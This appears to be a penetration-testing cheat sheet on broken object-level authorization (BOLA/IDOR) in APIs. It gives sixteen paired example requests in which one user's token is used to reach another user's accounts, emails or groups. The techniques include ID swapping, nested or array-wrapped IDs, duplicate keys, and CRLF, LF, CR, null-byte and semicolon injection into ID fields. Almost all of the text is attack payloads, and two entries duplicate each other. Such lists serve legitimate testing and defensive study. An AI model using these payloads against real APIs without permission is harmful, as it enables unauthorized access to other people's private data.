# 23. API Authorization (BOLA / IDOR Patterns)

## 1. Predictable IDs

```
GET /api/v1/account/2222
Token: UserA_token

GET /api/v1/account/3333
Token: UserA_token
```

## 2. Combined username + ID

```
GET /api/v1/UserA/data/2222
Token: UserA_token

GET /api/v1/UserB/data/3333
Token: UserA_token
```

## 3. Integer as the ID

```
POST /api/v1/account/
Token: UserA_token
{"Account": 2222 }

POST /api/v1/account/
Token: UserA_token
{"Account": [3333]}
```

## 4. Email as user ID

```
POST /api/v1/user/account
Token: UserA_token
{"email": "UserA@email.com"}

POST /api/v1/user/account
Token: UserA_token
{"email": "UserB@email.com"}
```

## 5. Group ID

```
GET /api/v1/group/CompanyA
Token: UserA_token

GET /api/v1/group/CompanyB
Token: UserA_token
```

## 6. Group + user combination

```
POST /api/v1/group/CompanyA
Token: UserA_token
{"email": "userA@CompanyA.com"}

POST /api/v1/group/CompanyB
Token: UserA_token
{"email": "userB@CompanyB.com"}
```

## 7. Wrap the ID inside a nested object

```
POST /api/v1/user/checking
Token: UserA_token
{"Account": 2222 }

POST /api/v1/user/checking
Token: UserA_token
{"Account": {"Account" :3333}}
```

## 8. Submit several IDs at once

```
POST /api/v1/user/checking
Token: UserA_token
{"Account": 2222 }

POST /api/v1/user/checking
Token: UserA_token
{"Account": 2222, "Account": 3333, "Account": 5555 }
```

## 9. Predictable token

```
POST /api/v1/user/account
Token: UserA_token
{"data": "DflK1df7jSdfa1acaa"}

POST /api/v1/user/account
Token: UserA_token
{"data": "DflK1df7jSdfa2dfaa"}
```

## Other tricks

### 10. CRLF (`%0d%0a`) inside the ID

```
POST /api/v1/user/checking
Token: UserA_token
{"Account": 2222 }

POST /api/v1/user/checking
Token: UserA_token
{"Account": 2222%0d%0a1111 }
```

### 11. LF (`%0a`) inside the ID

```
POST /api/v1/user/checking
Token: UserA_token
{"Account": 2222 }

POST /api/v1/user/checking
Token: UserA_token
{"Account": 2222%0a1111 }
```

### 12. CR (`%0d`) inside the ID

```
POST /api/v1/user/checking
Token: UserA_token
{"Account": 2222 }

POST /api/v1/user/checking
Token: UserA_token
{"Account": 2222%0d1111 }
```

### 13. Null byte (`%00`) inside the ID

```
POST /api/v1/user/checking
Token: UserA_token
{"Account": 2222 }

POST /api/v1/user/checking
Token: UserA_token
{"Account": 2222%001111 }
```

### 14. Array smuggling

```
POST /api/v1/user/checking
Token: UserA_token
{"Account": 2222 }

POST /api/v1/user/checking
Token: UserA_token
{"Account": [2222,1111] }
```

### 15. Semicolon-separated IDs

```
POST /api/v1/user/checking
Token: UserA_token
{"Account": 2222 }

POST /api/v1/user/checking
Token: UserA_token
{"Account": 2222;1111 }
```

### 16. JSON array of IDs in the same key

```
POST /api/v1/user/checking
Token: UserA_token
{"Account": 2222 }

POST /api/v1/user/checking
Token: UserA_token
{"Account": [2222,1111] }
```
